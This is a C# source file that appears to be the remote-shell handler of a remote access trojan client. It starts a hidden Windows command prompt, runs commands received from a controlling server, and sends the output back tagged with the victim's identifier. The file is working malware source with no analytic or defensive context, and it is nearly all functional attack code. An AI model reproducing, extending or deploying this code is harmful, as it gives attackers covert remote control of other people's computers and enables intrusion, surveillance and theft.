using Client.Network;
using Client.Utils;
using PacketLib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Handlers
{
    internal class HandleShell
    {
        private static Process Process { get;set; }
        private static bool IsRunning { get; set; }
        public static void StartShell()
        {
            Process = new Process()
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            Process.OutputDataReceived += ShellDataHandler;
            Process.ErrorDataReceived += ShellDataHandler;
            Process.Start();
            Process.BeginOutputReadLine();
            Process.BeginErrorReadLine();
            while (_Client.isConnected())
            {
                Thread.Sleep(800);
            }
            StopShell();
        }
        public static void StopShell()
        {
            if (Process == null) return;
            Process.OutputDataReceived -= ShellDataHandler;
            Process.ErrorDataReceived -= ShellDataHandler;
            Process.Kill();
            Process = null;
        }
        public static void CmdShell(string cmd)
        {
            Process.StandardInput.WriteLine(cmd);
        }

        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "OutputShell");
                msgPack.Set("UID", UID.Get());
                msgPack.Set("Output", Output.ToString());

                _Client.Send(msgPack.Pack());
            }
            catch { }
        }
    }
}
